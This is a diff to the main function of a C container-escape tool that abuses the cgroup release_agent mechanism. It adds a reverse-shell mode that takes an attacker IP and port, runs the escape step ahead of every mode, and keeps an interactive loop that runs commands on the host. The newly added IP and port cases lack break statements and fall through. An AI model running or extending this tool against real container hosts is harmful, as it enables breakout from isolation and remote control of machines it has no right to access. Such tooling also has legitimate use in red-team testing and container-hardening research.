@@ -22,17 +22,17 @@ int main(int argc, char *argv[]) {
 
     srand(time(NULL));
     static const struct option opts[] = {
-            {"help",          no_argument,       NULL, 'h'},
-            {"version",       no_argument,       NULL, 'v'},
-            {"auto-escape",   no_argument,       NULL, 'a'},
-            {"release-agent", no_argument,       NULL, 'r'},
-            {"devices-allow", no_argument,       NULL, 'd'},
-            {"path",          required_argument, NULL, 'p'},
-            {"mode",          required_argument, NULL, 'm'},
-            {"command",       required_argument, NULL, 'c'},
-            {"ip",            required_argument, NULL, 'I'},
-            {"port",          required_argument, NULL, 'P'},
-            {"bash",          no_argument,       NULL, 'b'}
+            {"help",           no_argument,       NULL, 'h'},
+            {"version",        no_argument,       NULL, 'v'},
+            {"auto-escape",    no_argument,       NULL, 'a'},
+            {"release-agent",  no_argument,       NULL, 'r'},
+            {"devices-allow",  no_argument,       NULL, 'd'},
+            {"container_path", required_argument, NULL, 'p'},
+            {"mode",           required_argument, NULL, 'm'},
+            {"command",        required_argument, NULL, 'c'},
+            {"ip",             required_argument, NULL, 'I'},
+            {"port",           required_argument, NULL, 'P'},
+            {"bash",           no_argument,       NULL, 'b'}
     };
     int opt;
     attack_info.attack_mode = -1;
@@ -69,6 +69,10 @@ int main(int argc, char *argv[]) {
                     exit(EXIT_SUCCESS);
                 }
                 break;
+            case 'I':
+                attack_info.ip = optarg;
+            case 'P':
+                attack_info.port = optarg;
 //            default:
 //                usage(argv[0]);
 //                break;
@@ -99,29 +103,24 @@ int main(int argc, char *argv[]) {
                 }
             }
 
+            printf_wrapper(INFO, "Try to get container path in host\n");
+            char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
+            get_container_path_in_host(container_path_in_host);
+            release_agent_attack_info.container_path_in_host = container_path_in_host;
+            escape_by_release_agent();
+
             if (attack_info.attack_mode == EXEC) {
-                printf_wrapper(INFO, "Try to get container path in host\n");
-                char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
-                get_container_path_in_host(container_path_in_host);
-                release_agent_attack_info.container_path_in_host = container_path_in_host;
-                escape_by_release_agent();
                 release_agent_exec();
             }
 
             if (attack_info.attack_mode == SHELL) {
-
-                printf_wrapper(INFO, "Try to get container path in host\n");
-                char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
-                get_container_path_in_host(container_path_in_host);
-                release_agent_attack_info.container_path_in_host = container_path_in_host;
-                escape_by_release_agent();
-
-                printf_wrapper(INFO, "About to enter shell, please enter 'quit' to exit shell, other way out, such as using 'ctrl+c' will not clean up the attack\n");
+                printf_wrapper(INFO,
+                               "About to enter shell, please enter 'quit' to exit shell, other way out, such as using 'ctrl+c' will not clean up the attack\n");
 
                 char *inputBuffer = malloc(sizeof(char) * DEFAULT_INPUT_BUFFER_SIZE);
                 memset(inputBuffer, 0x00, DEFAULT_INPUT_BUFFER_SIZE);
                 while (strcmp(inputBuffer, "quit") != 0) {
-                    printf("> ");
+                    printf("# ");
                     fgets(inputBuffer, DEFAULT_INPUT_BUFFER_SIZE, stdin);
 
                     if (inputBuffer[strlen(inputBuffer) - 1] != '\n') {
@@ -132,6 +131,10 @@ int main(int argc, char *argv[]) {
                     strcpy(attack_info.command, inputBuffer);
                     release_agent_exec();
                 }
+            }
+
+            if (attack_info.attack_mode == REVERSE) {
+                release_agent_reverse();
             }
             break;
         }
